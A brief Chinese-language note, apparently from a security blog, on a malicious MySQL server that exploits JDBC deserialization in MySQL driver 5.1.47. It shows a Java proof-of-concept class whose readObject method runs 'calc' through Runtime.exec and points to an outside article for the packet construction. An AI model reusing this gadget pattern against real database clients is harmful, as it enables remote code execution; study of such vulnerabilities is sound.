mysql jdbc反序列化漏洞的恶意数据库服务器

这里的例子针对的是mysql驱动5.1.47

Hello类代码
```
package serializable;

public class Hello implements Serializable{
    public static final long serialVersionUID = 42L;

    public Hello() throws IOException {
        System.out.println("Hello");
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        System.out.println("readObject");
        Runtime.getRuntime().exec("calc"); // calc
    }
}
```

具体包构造请看：https://mp.weixin.qq.com/s/h0YDLZ4igClNNBKf_I9e4w